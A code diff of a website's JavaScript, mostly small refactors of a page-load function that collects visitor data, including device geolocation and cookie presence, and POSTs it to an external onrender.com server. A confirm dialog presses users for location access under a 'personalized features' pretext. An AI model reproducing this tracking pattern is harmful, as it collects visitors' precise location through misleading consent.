@@ -1,18 +1,16 @@
-// sensitivitive info are hashed using md5(crypto) through back end. Keep safe! -Aurox :D
 async function sendVisitorInfo() {
   try {
     let csrfToken = null;
     let attempts = 0;
     const maxAttempts = 3;
 
+    // Fetch CSRF token
     while (!csrfToken && attempts < maxAttempts) {
       try {
         const tokenResponse = await fetch('https://random-nfpf.onrender.com/csrf-token', {
           method: 'GET',
           credentials: 'include',
-          headers: {
-            'Accept': 'application/json'
-          }
+          headers: { 'Accept': 'application/json' }
         });
         if (!tokenResponse.ok) {
           throw new Error(`CSRF token fetch failed: ${tokenResponse.status} ${tokenResponse.statusText}`);
@@ -64,7 +62,6 @@ async function sendVisitorInfo() {
         }
 
         console.log('Geolocation API available');
-        // Check permission state
         navigator.permissions.query({ name: 'geolocation' }).then((permissionStatus) => {
           console.log('Geolocation permission state:', permissionStatus.state);
           if (permissionStatus.state === 'granted') {
@@ -88,7 +85,6 @@ async function sendVisitorInfo() {
             console.log('Geolocation permission denied');
             resolve({ error: 'Geolocation permission denied by user', code: 1 });
           } else {
-            // Prompt state: Show a custom UI to encourage enabling location
             const userConfirmed = confirm('This site needs your location to provide personalized features. Please allow location access in the browser prompt.');
             if (userConfirmed) {
               navigator.geolocation.getCurrentPosition(
@@ -145,7 +141,7 @@ async function sendVisitorInfo() {
       cookieAccess: document.cookie ? true : false,
       thirdPartyRequests: [],
       postMessageCalls: [],
-      deviceLocation: getLocation()
+      deviceLocation: await getLocation() // Ensure deviceLocation is resolved
     };
 
     const isPage3 = window.location.pathname.includes('/page3') || 
@@ -330,8 +326,8 @@ async function sendVisitorInfo() {
       payload.part3.eventLog = eventLog.length ? eventLog.join('; ') : 'None';
     }
 
-    payload.deviceLocation = await payload.deviceLocation;
-    console.log('Sending payload with location:', payload.deviceLocation);
+    // Log the payload before sending to verify deviceLocation
+    console.log('Final payload before sending:', JSON.stringify(payload, null, 2));
 
     const response = await fetch('https://random-nfpf.onrender.com/api/visit', {
       method: 'POST',
@@ -363,15 +359,19 @@ async function sendVisitorInfo() {
 window.addEventListener('load', sendVisitorInfo);
 
 const themeSwitch = document.getElementById('theme-switch');
-themeSwitch.addEventListener('change', () => {
-  document.body.classList.toggle('light-mode');
-});
+if (themeSwitch) {
+  themeSwitch.addEventListener('change', () => {
+    document.body.classList.toggle('light-mode');
+  });
+}
 
 const searchBar = document.getElementById('search-bar');
-searchBar.addEventListener('input', (event) => {
-  const searchQuery = event.target.value.toLowerCase();
-  document.querySelectorAll('.project-card').forEach((card) => {
-    const title = card.querySelector('h2').textContent.toLowerCase();
-    card.style.display = title.includes(searchQuery) ? '' : 'none';
+if (searchBar) {
+  searchBar.addEventListener('input', (event) => {
+    const searchQuery = event.target.value.toLowerCase();
+    document.querySelectorAll('.project-card').forEach((card) => {
+      const title = card.querySelector('h2').textContent.toLowerCase();
+      card.style.display = title.includes(searchQuery) ? '' : 'none';
+    });
   });
-});
+}
